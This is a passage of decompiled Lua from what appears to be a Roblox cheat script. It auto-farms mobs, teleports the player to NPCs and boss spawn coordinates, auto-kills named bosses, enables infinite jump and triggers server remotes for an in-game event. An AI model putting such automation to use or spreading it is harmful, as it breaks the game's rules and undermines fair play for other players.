                    capturedTextValueState,
                    capturedCallback12,
                    capturedCallback13,
                    capturedCallback8,
                    capturedCallback15,
                    capturedCallback14,
                    capturedCallback5,
                    capturedItems44
                )
            )
        end
        return
    end, closureEnvironment)
end

function functions.handlePcallAtLine101(closureEnvironment, capturedItems41, capturedCallback6)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        environment.pcall(functions.handleCallbackAtLine8(environment, capturedItems41, capturedCallback6))
        return
    end, closureEnvironment)
end

function functions.handleCallbackAtLine8(closureEnvironment, capturedItems41, capturedCallback6)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local value
        value = capturedItems41[environment._G.SelectedMob]
        if not ((not value) or not value.Island) then
            capturedCallback6(value.Island)
        end
        return
    end, closureEnvironment)
end

function functions.handlePcallAtLine18(
    closureEnvironment,
    capturedItems41,
    capturedLocalPlayer2,
    capturedTextValueState,
    capturedCallback12,
    capturedCallback13,
    capturedCallback8,
    capturedCallback15,
    capturedCallback14,
    capturedCallback5,
    capturedItems44
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        while true do
            if environment._G.AutoMobFarm then
                environment.task.wait(0.1)
                if
                    not environment._G.BossIsActive
                    and ((not environment._G.CheckingBosses) and not environment._G.IsPortaling)
                then
                    environment.pcall(
                        functions.handleFindFirstChildAtLine72(
                            environment,
                            capturedItems41,
                            capturedLocalPlayer2,
                            capturedTextValueState,
                            capturedCallback12,
                            capturedCallback13,
                            capturedCallback8,
                            capturedCallback15,
                            capturedCallback14,
                            capturedCallback5,
                            capturedItems44
                        )
                    )
                end
                continue
            end
            break
        end
        return
    end, closureEnvironment)
end

function functions.handleFindFirstChildAtLine72(
    closureEnvironment,
    capturedItems41,
    capturedLocalPlayer2,
    capturedTextValueState,
    capturedCallback12,
    capturedCallback13,
    capturedCallback8,
    capturedCallback15,
    capturedCallback14,
    capturedCallback5,
    capturedItems44
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local callResults, callResults2, callResults3, callResults4, character, find, fireServer, hasNext, huge, humanoidRootPart, items, iterationCursor
        local iterationCursor2, iterationLimit, iterationStep, iteratorKey, iteratorValue, iteratorValue2, iteratorValue3, iteratorValue4, iteratorValue5, magnitude, nPCs, nPCs2
        local name, pairsValue, result, result2, savedIterations, savedIterations2, unpackValue, value, value2, workspaceValue
        value = capturedItems41[environment._G.SelectedMob]
        if not ((not value) or not capturedLocalPlayer2.Character) then
            character = capturedLocalPlayer2.Character
            if character.FindFirstChild(character, "HumanoidRootPart") then
                humanoidRootPart = capturedLocalPlayer2.Character.HumanoidRootPart
                if not ((not capturedTextValueState.value) or not (capturedCallback12())) then
                    value2 = capturedTextValueState.value
                    fireServer = value2.FireServer
                    unpackValue = environment.unpack
                    items = runtime.create(1)
                    runtime.move({ value.QuestNPC }, 1, 1, 1, items)
                    callResults4 = runtime.pack(unpackValue(items))
                    fireServer(value2, runtime.unpack(callResults4, 1, (((callResults4.n + 5) - 1) - 4)))
                    environment.task.wait(0.2)
                end
                iteratorValue2 = nil
                huge = environment.math.huge
                workspaceValue = environment.workspace
                nPCs = workspaceValue.FindFirstChild(workspaceValue, "NPCs")
                if nPCs then
                    pairsValue = environment.pairs
                    nPCs2 = nPCs
                    callResults = runtime.pack(nPCs2.GetChildren(nPCs2))
                    callResults2 = runtime.pack(
                        pairsValue(runtime.unpack(callResults, 1, (((callResults.n + 7) - 1) - 6)))
                    )
                    callResults3 = callResults2
                    savedIterations2 = { nil, [5] = nil, nil, nil }
                    result2 = runtime.wrapIterator(runtime.iteratorBody1)
                    result2(callResults3[1], callResults3[2], callResults3[3])
                    iteratorValue4 = nil
                    iterationCursor2 = result2
                    while true do
                        hasNext, iteratorKey, iteratorValue5 = iterationCursor2()
                        if not hasNext then
                        else
                            iteratorValue4 = iteratorValue5
                        end
                        if hasNext then
                            if environment.table.find(value.MobNames, iteratorValue4.Name) then
                                iteratorValue3 = iteratorValue4
                                if
                                    not (
                                        not (iteratorValue3.FindFirstChild(iteratorValue3, "Humanoid"))
                                        or not (0 < iteratorValue4.Humanoid.Health)
                                    )
                                then
                                    iteratorValue = iteratorValue4
                                    if iteratorValue.FindFirstChild(iteratorValue, "HumanoidRootPart") then
                                        find = environment.string.find
                                        name = iteratorValue4.Name
                                        if not (find((name.lower(name)), "dummy")) then
                                            magnitude = (
                                                (
                                                    humanoidRootPart.Position
                                                    - iteratorValue4.HumanoidRootPart.Position
                                                )
                                            ).Magnitude
                                            if magnitude < huge then
                                                huge = magnitude
                                                iteratorValue2 = iteratorValue4
                                            end
                                        end
                                    end
                                end
                            end
                            continue
                        end
                        break
                    end
                    iterationCursor = savedIterations2[3]
                    iterationLimit = savedIterations2[2]
                    iterationStep = savedIterations2[5]
                    savedIterations = savedIterations2[1]
                end
                if not iteratorValue2 then
                    result = capturedCallback5(environment._G.SelectedMob)
                    if not result then
                        if not ((not value.Island) or not capturedItems44[value.Island]) then
                            capturedCallback8(
                                (capturedItems44[value.Island] * (environment.CFrame.new(0, 0, 0)))
                            )
                        end
                    else
                        capturedCallback8(result)
                    end
                else
                    capturedCallback8((capturedCallback13(iteratorValue2.HumanoidRootPart)))
                    if
                        not ((not environment._G.AutoEquipEnabled) or not environment._G.SelectedWeaponGroup)
                    then
                        capturedCallback15(environment._G.SelectedWeaponGroup)
                    end
                    capturedCallback14()
                end
            end
        end
        return
    end, closureEnvironment)
end

function functions.handleFindFirstChildAtLine105(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local gameValue, leaderstats, leaderstats2, localPlayer, localPlayer2, localPlayer3, value
        gameValue = environment.game
        localPlayer = (gameValue.GetService(gameValue, "Players")).LocalPlayer
        value = 0
        localPlayer2 = localPlayer
        leaderstats2 = localPlayer2.FindFirstChild(localPlayer2, "Data")
        if not leaderstats2 then
            localPlayer3 = localPlayer
            leaderstats2 = localPlayer3.FindFirstChild(localPlayer3, "leaderstats")
        end
        if leaderstats2 then
            leaderstats = leaderstats2
            if leaderstats.FindFirstChild(leaderstats, "Level") then
                value = leaderstats2.Level.Value
            end
        end
        if not (10750 <= value) then
            if not (10000 <= value) then
                if not (9000 <= value) then
                    if not (8000 <= value) then
                        if not (7000 <= value) then
                            if not (6000 <= value) then
                                if not (5000 <= value) then
                                    if not (4000 <= value) then
                                        if not (3000 <= value) then
                                            if not (2000 <= value) then
                                                if not (1500 <= value) then
                                                    if not (1000 <= value) then
                                                        if not (750 <= value) then
                                                            if not (500 <= value) then
                                                                if not (250 <= value) then
                                                                    if not (25 <= value) then
                                                                        return "Thief (Lv. 10)"
                                                                    else
                                                                        return "Thief Boss (Lv. 25)"
                                                                    end
                                                                else
                                                                    return "Monkey (Lv. 250)"
                                                                end
                                                            else
                                                                return "Monkey Boss (Lv. 500)"
                                                            end
                                                        else
                                                            return "Desert Bandit (Lv. 750)"
                                                        end
                                                    else
                                                        return "Desert Boss (Lv. 1000)"
                                                    end
                                                else
                                                    return "Frost Rogue (Lv. 1500)"
                                                end
                                            else
                                                return "Snow Boss (Lv. 2000)"
                                            end
                                        else
                                            return "Sorcerer Student (Lv. 3000)"
                                        end
                                    else
                                        return "Panda Boss (Lv. 4000)"
                                    end
                                else
                                    return "Hollow (Lv. 5000)"
                                end
                            else
                                return "Strong Sorcerer (Lv. 6000)"
                            end
                        else
                            return "Curse (Lv. 7000)"
                        end
                    else
                        return "Slime (Lv. 8000)"
                    end
                else
                    return "Academy Teacher (Lv. 9000)"
                end
            else
                return "Swordsman (Lv. 10000)"
            end
        else
            return "Quincy (Lv. 10750)"
        end
    end, closureEnvironment)
end

function functions.handleCallbackAtLine1449(closureEnvironment, capturedCallback, capturedItems41)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        return capturedItems41[(capturedCallback())]
    end, closureEnvironment)
end

function functions.handleCallback25(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local infJumpEnabled = ...
        local gValue
        gValue = environment._G
        gValue.InfJumpEnabled = infJumpEnabled
        return
    end, closureEnvironment)
end

function functions.handleWaitAtLine57(
    closureEnvironment,
    capturedOptions,
    capturedCallback8,
    capturedCallback13,
    capturedCallback15,
    capturedCallback14
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        while true do
            environment.task.wait(0.1)
            if
                not (
                    ((not capturedOptions.AutoKillGilgamesh) or not capturedOptions.AutoKillGilgamesh.Value)
                    or environment._G.IsPortaling
                )
            then
                environment.pcall(
                    functions.handleFindFirstChildAtLine84(
                        environment,
                        capturedCallback8,
                        capturedCallback13,
                        capturedCallback15,
                        capturedCallback14
                    )
                )
            end
            continue
        end
    end, closureEnvironment)
end

function functions.handleFindFirstChildAtLine84(
    closureEnvironment,
    capturedCallback8,
    capturedCallback13,
    capturedCallback15,
    capturedCallback14
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local callResults, callResults2, callResults3, callResults4, enemies, find, find2, findFirstChildResult, findFirstChildResult2, findFirstChildResult3, findFirstChildResult4, gValue
        local gilgameshBoss, gilgameshBoss2, gilgameshBoss3, gilgameshBoss4, gilgameshBoss5, hasNext, items, items2, iterationCursor, iterationCursor2, iterationLimit, iterationStep
        local iteratorKey, iteratorValue, iteratorValue2, iteratorValue3, mobs, nPCs, nPCs2, nPCs3, name, name2, result, savedIterations
        local savedIterations2, textValue, value, value2, workspaceValue, workspaceValue2, workspaceValue3, workspaceValue4, workspaceValue5, workspaceValue6
        if not environment._G.HasWarpedToGilgamesh then
            value2 = capturedCallback8
            callResults = runtime.pack(
                environment.CFrame.new(
                    651.810181,
                    -3.67419362,
                    -1021.13123,
                    -0.694649816,
                    0,
                    -0.719348073,
                    0,
                    1,
                    0,
                    0.719348073,
                    0,
                    -0.694649816
                )
            )
            value2(runtime.unpack(callResults, 1, (((callResults.n + 2) - 1) - 1)))
            gValue = environment._G
            gValue.HasWarpedToGilgamesh = true
            environment.task.wait(1)
        end
        findFirstChildResult2 = nil
        workspaceValue = environment.workspace
        nPCs2 = workspaceValue.FindFirstChild(workspaceValue, "NPCs")
        if nPCs2 then
            nPCs = nPCs2
            gilgameshBoss = nPCs.FindFirstChild(nPCs, "GilgameshBoss")
            if gilgameshBoss then
                gilgameshBoss2 = gilgameshBoss
                if
                    not (
                        not (gilgameshBoss2.FindFirstChild(gilgameshBoss2, "Humanoid"))
                        or not (0 < gilgameshBoss.Humanoid.Health)
                    )
                then
                    gilgameshBoss3 = gilgameshBoss
                    if gilgameshBoss3.FindFirstChild(gilgameshBoss3, "HumanoidRootPart") then
                        find = environment.string.find
                        name = gilgameshBoss.Name
                        if not (find((name.lower(name)), "dummy")) then
                            gilgameshBoss5 = gilgameshBoss
                            if (gilgameshBoss5.GetAttribute(gilgameshBoss5, "_NPCReady")) ~= value then
                                gilgameshBoss4 = gilgameshBoss
                                if (gilgameshBoss4.GetAttribute(gilgameshBoss4, "_NPCReady")) == true then
                                    findFirstChildResult2 = gilgameshBoss
                                end
                            else
                                findFirstChildResult2 = gilgameshBoss
                            end
                        end
                    end
                end
            end
        end
        if not findFirstChildResult2 then
            items = runtime.create(4)
            workspaceValue2 = environment.workspace
            workspaceValue3 = environment.workspace
            enemies = workspaceValue3.FindFirstChild(workspaceValue3, "Enemies")
            workspaceValue4 = environment.workspace
            mobs = workspaceValue4.FindFirstChild(workspaceValue4, "Mobs")
            workspaceValue5 = environment.workspace
            nPCs3 = workspaceValue5.FindFirstChild(workspaceValue5, "NPCs")
            workspaceValue6 = environment.workspace
            callResults2 = runtime.pack(workspaceValue6.FindFirstChild(workspaceValue6, "Npcs"))
            items2 = items
            runtime.move({ workspaceValue2, enemies, mobs, nPCs3 }, 1, 4, 1, items2)
            runtime.move(callResults2, 1, (((callResults2.n + 8) - 1) - 7), 5, items2)
            textValue = ("GilgameshBoss_" .. environment._G.SelectedGilgameshDifficulty)
            callResults3 = runtime.pack(environment.pairs(items))
            callResults4 = callResults3
            savedIterations2 = { nil, [5] = nil, nil, nil }
            result = runtime.wrapIterator(runtime.iteratorBody1)
            result(callResults4[1], callResults4[2], callResults4[3])
            iteratorValue2 = nil
            iterationCursor2 = result
            while true do
                hasNext, iteratorKey, iteratorValue = iterationCursor2()
                if not hasNext then
                else
                    iteratorValue2 = iteratorValue
                end
                if hasNext then
                    if not iteratorValue2 then
                        if not findFirstChildResult2 then
                            continue
                        end
                    else
                        iteratorValue3 = iteratorValue2
                        findFirstChildResult4 = iteratorValue3.FindFirstChild(iteratorValue3, textValue)
                        if not findFirstChildResult4 then
                            if not findFirstChildResult2 then
                                continue
                            end
                        else
                            findFirstChildResult = findFirstChildResult4
                            if
                                not (findFirstChildResult.FindFirstChild(findFirstChildResult, "Humanoid"))
                                or not (0 < findFirstChildResult4.Humanoid.Health)
                            then
                                if not findFirstChildResult2 then
                                    continue
                                end
                            else
                                findFirstChildResult3 = findFirstChildResult4
                                if
                                    not (
                                        findFirstChildResult3.FindFirstChild(
                                            findFirstChildResult3,
                                            "HumanoidRootPart"
                                        )
                                    )
                                then
                                    if not findFirstChildResult2 then
                                        continue
                                    end
                                else
                                    find2 = environment.string.find
                                    name2 = findFirstChildResult4.Name
                                    if not (find2((name2.lower(name2)), "dummy")) then
                                        findFirstChildResult2 = findFirstChildResult4
                                    else
                                        if not findFirstChildResult2 then
                                            continue
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
                break
            end
            iterationCursor = savedIterations2[3]
            iterationLimit = savedIterations2[2]
            iterationStep = savedIterations2[5]
            savedIterations = savedIterations2[1]
        end
        if findFirstChildResult2 then
            capturedCallback8((capturedCallback13(findFirstChildResult2.HumanoidRootPart)))
            if environment._G.SelectedWeaponGroup then
                capturedCallback15(environment._G.SelectedWeaponGroup)
            end
            capturedCallback14()
        end
        return
    end, closureEnvironment)
end

function functions.handleCallback26(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local selectNPCTP = ...
        local gValue
        gValue = environment._G
        gValue.SelectNPCTP = selectNPCTP
        return
    end, closureEnvironment)
end

function functions.callbackAtLine38(
    closureEnvironment,
    capturedItems21,
    capturedLocalPlayer2,
    capturedCallback9,
    capturedCallback8
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local character, value
        if
            not (
                not environment._G.SelectNPCTP
                or ((not capturedItems21[environment._G.SelectNPCTP]) or not capturedLocalPlayer2.Character)
            )
        then
            character = capturedLocalPlayer2.Character
            if character.FindFirstChild(character, "HumanoidRootPart") then
                value = capturedItems21[environment._G.SelectNPCTP]
                capturedCallback9(value.Position)
                environment.task.wait(2)
                capturedCallback8(value)
            end
        end
        return
    end, closureEnvironment)
end

function functions.handleWait4(
    closureEnvironment,
    capturedOptions,
    capturedCallback8,
    capturedCallback13,
    capturedCallback15,
    capturedCallback14
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        while true do
            environment.task.wait(0.1)
            if
                not (
                    not capturedOptions.AutoKillMaiden
                    or ((not capturedOptions.AutoKillMaiden.Value) or environment._G.IsPortaling)
                )
            then
                environment.pcall(
                    functions.handleFindFirstChildAtLine38(
                        environment,
                        capturedCallback8,
                        capturedCallback13,
                        capturedCallback15,
                        capturedCallback14
                    )
                )
            end
            continue
        end
    end, closureEnvironment)
end

function functions.handleFindFirstChildAtLine38(
    closureEnvironment,
    capturedCallback8,
    capturedCallback13,
    capturedCallback15,
    capturedCallback14
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local blessedMaidenBoss, blessedMaidenBoss2, blessedMaidenBoss3, blessedMaidenBoss4, blessedMaidenBoss5, callResults, callResults2, callResults3, callResults4, enemies, find, find2
        local findFirstChildResult, findFirstChildResult2, findFirstChildResult3, findFirstChildResult4, gValue, hasNext, items, items2, iterationCursor, iterationCursor2, iterationLimit, iterationStep
        local iteratorKey, iteratorValue, iteratorValue2, iteratorValue3, mobs, nPCs, nPCs2, nPCs3, name, name2, result, savedIterations
        local savedIterations2, textValue, value, value2, workspaceValue, workspaceValue2, workspaceValue3, workspaceValue4, workspaceValue5, workspaceValue6
        if not environment._G.HasWarpedToMaiden then
            value2 = capturedCallback8
            callResults4 = runtime.pack(
                environment.CFrame.new(
                    651.810181,
                    -3.67419362,
                    -1021.13123,
                    -0.694649816,
                    0,
                    -0.719348073,
                    0,
                    1,
                    0,
                    0.719348073,
                    0,
                    -0.694649816
                )
            )
            value2(runtime.unpack(callResults4, 1, (((callResults4.n + 2) - 1) - 1)))
            gValue = environment._G
            gValue.HasWarpedToMaiden = true
            environment.task.wait(1)
        end
        findFirstChildResult2 = nil
        workspaceValue = environment.workspace
        nPCs = workspaceValue.FindFirstChild(workspaceValue, "NPCs")
        if nPCs then
            nPCs3 = nPCs
            blessedMaidenBoss3 = nPCs3.FindFirstChild(nPCs3, "BlessedMaidenBoss")
            if blessedMaidenBoss3 then
                blessedMaidenBoss = blessedMaidenBoss3
                if
                    not (
                        not (blessedMaidenBoss.FindFirstChild(blessedMaidenBoss, "Humanoid"))
                        or not (0 < blessedMaidenBoss3.Humanoid.Health)
                    )
                then
                    blessedMaidenBoss4 = blessedMaidenBoss3
                    if blessedMaidenBoss4.FindFirstChild(blessedMaidenBoss4, "HumanoidRootPart") then
                        find = environment.string.find
                        name = blessedMaidenBoss3.Name
                        if not (find((name.lower(name)), "dummy")) then
                            blessedMaidenBoss2 = blessedMaidenBoss3
                            if
                                (blessedMaidenBoss2.GetAttribute(blessedMaidenBoss2, "_NPCReady")) ~= value
                            then
                                blessedMaidenBoss5 = blessedMaidenBoss3
                                if
                                    (blessedMaidenBoss5.GetAttribute(blessedMaidenBoss5, "_NPCReady")) == true
                                then
                                    findFirstChildResult2 = blessedMaidenBoss3
                                end
                            else
                                findFirstChildResult2 = blessedMaidenBoss3
                            end
                        end
                    end
                end
            end
        end
        if not findFirstChildResult2 then
            items = runtime.create(4)
            workspaceValue2 = environment.workspace
            workspaceValue3 = environment.workspace
            enemies = workspaceValue3.FindFirstChild(workspaceValue3, "Enemies")
            workspaceValue4 = environment.workspace
            mobs = workspaceValue4.FindFirstChild(workspaceValue4, "Mobs")
            workspaceValue5 = environment.workspace
            nPCs2 = workspaceValue5.FindFirstChild(workspaceValue5, "NPCs")
            workspaceValue6 = environment.workspace
            callResults = runtime.pack(workspaceValue6.FindFirstChild(workspaceValue6, "Npcs"))
            items2 = items
            runtime.move({ workspaceValue2, enemies, mobs, nPCs2 }, 1, 4, 1, items2)
            runtime.move(callResults, 1, (((callResults.n + 8) - 1) - 7), 5, items2)
            textValue = ("BlessedMaidenBoss_" .. environment._G.SelectedMaidenDifficulty)
            callResults2 = runtime.pack(environment.pairs(items))
            callResults3 = callResults2
            savedIterations = { nil, [5] = nil, nil, nil }
            result = runtime.wrapIterator(runtime.iteratorBody1)
            result(callResults3[1], callResults3[2], callResults3[3])
            iteratorValue2 = nil
            iterationCursor = result
            while true do
                hasNext, iteratorKey, iteratorValue3 = iterationCursor()
                if not hasNext then
                else
                    iteratorValue2 = iteratorValue3
                end
                if hasNext then
                    if not iteratorValue2 then
                        if not findFirstChildResult2 then
                            continue
                        end
                    else
                        iteratorValue = iteratorValue2
                        findFirstChildResult = iteratorValue.FindFirstChild(iteratorValue, textValue)
                        if not findFirstChildResult then
                            if not findFirstChildResult2 then
                                continue
                            end
                        else
                            findFirstChildResult3 = findFirstChildResult
                            if
                                not (findFirstChildResult3.FindFirstChild(findFirstChildResult3, "Humanoid"))
                                or not (0 < findFirstChildResult.Humanoid.Health)
                            then
                                if not findFirstChildResult2 then
                                    continue
                                end
                            else
                                findFirstChildResult4 = findFirstChildResult
                                if
                                    not (
                                        findFirstChildResult4.FindFirstChild(
                                            findFirstChildResult4,
                                            "HumanoidRootPart"
                                        )
                                    )
                                then
                                    if not findFirstChildResult2 then
                                        continue
                                    end
                                else
                                    find2 = environment.string.find
                                    name2 = findFirstChildResult.Name
                                    if not (find2((name2.lower(name2)), "dummy")) then
                                        findFirstChildResult2 = findFirstChildResult
                                    else
                                        if not findFirstChildResult2 then
                                            continue
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
                break
            end
            iterationCursor2 = savedIterations[3]
            iterationLimit = savedIterations[2]
            iterationStep = savedIterations[5]
            savedIterations2 = savedIterations[1]
        end
        if findFirstChildResult2 then
            capturedCallback8((capturedCallback13(findFirstChildResult2.HumanoidRootPart)))
            if environment._G.SelectedWeaponGroup then
                capturedCallback15(environment._G.SelectedWeaponGroup)
            end
            capturedCallback14()
        end
        return
    end, closureEnvironment)
end

function functions.handleCallback27(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local selectedSkills = ...
        local gValue
        gValue = environment._G
        gValue.SelectedSkills = selectedSkills
        return
    end, closureEnvironment)
end

function functions.handleCallback28(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local selectedWeaponGroup = ...
        local gValue
        gValue = environment._G
        gValue.SelectedWeaponGroup = selectedWeaponGroup
        return
    end, closureEnvironment)
end

function functions.handleSpawn9(closureEnvironment, capturedCallback15)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local autoEquipEnabled = ...
        local gValue
        gValue = environment._G
        gValue.AutoEquipEnabled = autoEquipEnabled
        environment.task.spawn(functions.handleWaitAtLine1320(environment, capturedCallback15))
        return
    end, closureEnvironment)
end

function functions.handleWaitAtLine1320(closureEnvironment, capturedCallback15)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        while true do
            if environment._G.AutoEquipEnabled then
                environment.task.wait(0.5)
                environment.pcall(functions.handleCallbackAtLine1322(environment, capturedCallback15))
                continue
            end
            break
        end
        return
    end, closureEnvironment)
end

function functions.handleCallbackAtLine1322(closureEnvironment, capturedCallback15)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        if environment._G.SelectedWeaponGroup then
            capturedCallback15(environment._G.SelectedWeaponGroup)
        end
        return
    end, closureEnvironment)
end

function functions.handleSpawn10(closureEnvironment, capturedCallback9)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local argument1 = ...
        local gValue
        if argument1 then
            gValue = environment._G
            gValue.HasWarpedToMaiden = false
            environment.task.spawn(functions.handleNewAtLine41(environment, capturedCallback9))
        end
        return
    end, closureEnvironment)
end

function functions.handleNewAtLine41(closureEnvironment, capturedCallback9)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local callResults, value
        value = capturedCallback9
        callResults = runtime.pack(environment.Vector3.new(651.810181, -3.67419362, -1021.13123))
        value(runtime.unpack(callResults, 1, (((callResults.n + 2) - 1) - 1)))
        return
    end, closureEnvironment)
end

function functions.handleMatch(closureEnvironment, capturedItems42)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local argument1 = ...
        local argument12, matchResult, matchResult2, value
        argument12 = argument1
        if not argument12 then
            return nil
        else
            matchResult2 = environment.string.match(argument12, "([%a%s]+)%s*%(")
            if not matchResult2 then
                return nil
            else
                matchResult = matchResult2
                value = (matchResult.match(matchResult, "^%s*(.-)%s*$"))
                return capturedItems42[(environment.string.gsub(value, "%s+", ""))]
            end
        end
    end, closureEnvironment)
end

function functions.handlePairs2(closureEnvironment, capturedNumberValueState3)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local argument1 = ...
        local argument12, callResults, callResults2, hasNext, iterationCursor, iterationCursor2, iterationLimit, iterationStep, iteratorKey, iteratorValue, iteratorValue2, quantity
        local result, savedIterations, savedIterations2, tostringValue
        argument12 = argument1
        callResults = runtime.pack(environment.pairs(capturedNumberValueState3.value))
        callResults2 = callResults
        savedIterations2 = { nil, [5] = nil, nil, nil }
        result = runtime.wrapIterator(runtime.iteratorBody1)
        result(callResults2[1], callResults2[2], callResults2[3])
        iteratorValue2 = nil
        iterationCursor2 = result
        while true do
            hasNext, iteratorKey, iteratorValue = iterationCursor2()
            if not hasNext then
            else
                iteratorValue2 = iteratorValue
            end
            if hasNext then
                if iteratorValue2.name == argument12 then
                    tostringValue = environment.tostring
                    quantity = iteratorValue2.quantity
                    if not quantity then
                        quantity = 1
                    end
                    return tostringValue(quantity)
                else
                    continue
                end
            end
            break
        end
        iterationCursor = savedIterations2[3]
        iterationLimit = savedIterations2[2]
        iterationStep = savedIterations2[5]
        savedIterations = savedIterations2[1]
        return "0"
    end, closureEnvironment)
end

function functions.handleCallback29(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local argument1 = ...
        return ("```\n" .. (argument1 .. " EA\n```"))
    end, closureEnvironment)
end

function functions.handleSpawn11(
    closureEnvironment,
    capturedOptions,
    capturedCallback9,
    capturedNewResult2,
    capturedCallback10,
    capturedCallback11,
    capturedItems49
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local argument1 = ...
        if argument1 then
            environment.task.spawn(
                functions.handleWait5(
                    environment,
                    capturedOptions,
                    capturedCallback9,
                    capturedNewResult2,
                    capturedCallback10,
                    capturedCallback11,
                    capturedItems49
                )
            )
        end
        return
    end, closureEnvironment)
end

function functions.handleWait5(
    closureEnvironment,
    capturedOptions,
    capturedCallback9,
    capturedNewResult2,
    capturedCallback10,
    capturedCallback11,
    capturedItems49
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        while true do
            if
                not (
                    ((not capturedOptions) or not capturedOptions.AutoHogyokuEvent)
                    or not capturedOptions.AutoHogyokuEvent.Value
                )
            then
                if not environment._G.IsPortaling then
                    environment.pcall(
                        functions.handleWaitAtLine123(
                            environment,
                            capturedCallback9,
                            capturedNewResult2,
                            capturedOptions,
                            capturedCallback10,
                            capturedCallback11,
                            capturedItems49
                        )
                    )
                else
                    environment.task.wait(1)
                end
                environment.task.wait(1)
                continue
            end
            break
        end
        return
    end, closureEnvironment)
end

function functions.handleWaitAtLine123(
    closureEnvironment,
    capturedCallback9,
    capturedNewResult2,
    capturedOptions,
    capturedCallback10,
    capturedCallback11,
    capturedItems49
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local gameValue, iterationCursor, iterationCursor2, iterationCursor3, iterationCursor4, iterationCursor5, iterationCursor6, iterationLimit, iterationLimit2, iterationLimit3, iterationLimit4, iterationLimit5
        local iterationStep, iterationStep2, iterationStep3, iterationStep4, iterationStep5, matches, matches2, matches3, savedIterations, savedIterations2, savedIterations3, savedIterations4
        local savedIterations5, value, value2, value3, value4, value5
        capturedCallback9(capturedNewResult2.Position)
        environment.task.wait(1.5)
        if not capturedOptions.AutoHogyokuEvent.Value then
            return
        else
            capturedCallback10(capturedNewResult2, 15, capturedOptions.AutoHogyokuEvent)
            if not capturedOptions.AutoHogyokuEvent.Value then
                return
            else
                savedIterations3 = { nil, [5] = nil, nil, nil }
                iterationStep4 = (1 + 0)
                iterationLimit4 = (3 + 0)
                iterationCursor2 = (1 - iterationStep4)
                while true do
                    iterationCursor2 = (iterationCursor2 + iterationStep4)
                    if iterationStep4 <= 0 then
                        matches = (iterationCursor2 >= iterationLimit4)
                    else
                        matches = (iterationCursor2 <= iterationLimit4)
                    end
                    if matches then
                        if not capturedOptions.AutoHogyokuEvent.Value then
                            return
                        else
                            capturedCallback11()
                            environment.task.wait(0.5)
                            continue
                        end
                    end
                    break
                end
                iterationCursor6 = savedIterations3[3]
                iterationLimit5 = savedIterations3[2]
                iterationStep5 = savedIterations3[5]
                savedIterations4 = savedIterations3[1]
                gameValue = environment.game
                value = (gameValue.GetService(gameValue, "ReplicatedStorage"))
                value2 = (value.WaitForChild(value, "Remotes"))
                value3 = (value2.WaitForChild(value2, "EventRemotes"))
                value4 = (value3.WaitForChild(value3, "GetEvents"))
                value4.InvokeServer(value4)
                environment.task.wait(1)
                iterationCursor5 = nil
                savedIterations2 =
                    { savedIterations4, [5] = iterationStep5, iterationLimit5, iterationCursor6 }
                iterationStep3 = (1 + 0)
                iterationLimit3 = (6 + 0)
                iterationCursor4 = (1 - iterationStep3)
                while true do
                    iterationCursor4 = (iterationCursor4 + iterationStep3)
                    if iterationStep3 <= 0 then
                        matches2 = (iterationCursor4 >= iterationLimit3)
                    else
                        matches2 = (iterationCursor4 <= iterationLimit3)
                    end
                    if matches2 then
                        iterationCursor5 = iterationCursor4
                    end
                    if
                        (matches2 and capturedOptions.AutoHogyokuEvent.Value)
                        and not environment._G.IsPortaling
                    then
                        value5 = capturedItems49[("Hogyoku #" .. iterationCursor5)]
                        if not value5 then
                            continue
                        else
                            capturedCallback9(value5.Position)
                            environment.task.wait(1.5)
                            if not capturedOptions.AutoHogyokuEvent.Value then
                                return
                            else
                                capturedCallback10(value5, 15, capturedOptions.AutoHogyokuEvent)
                                if not capturedOptions.AutoHogyokuEvent.Value then
                                    return
                                else
                                    savedIterations5 = {
                                        savedIterations2,
                                        [5] = iterationStep3,
                                        iterationLimit3,
                                        iterationCursor4,
                                    }
                                    iterationStep = (1 + 0)
                                    iterationLimit = (5 + 0)
                                    iterationCursor = (1 - iterationStep)
                                    while true do
                                        iterationCursor = (iterationCursor + iterationStep)
                                        if iterationStep <= 0 then
                                            matches3 = (iterationCursor >= iterationLimit)
                                        else
                                            matches3 = (iterationCursor <= iterationLimit)
                                        end
                                        if matches3 then
                                            if not capturedOptions.AutoHogyokuEvent.Value then
                                                return
                                            else
                                                capturedCallback11()
                                                environment.task.wait(0.3)
                                                continue
                                            end
                                        end
                                        break
                                    end
                                    iterationCursor4 = savedIterations5[3]
                                    iterationLimit3 = savedIterations5[2]
                                    iterationStep3 = savedIterations5[5]
                                    savedIterations2 = savedIterations5[1]
                                    continue
                                end
                            end
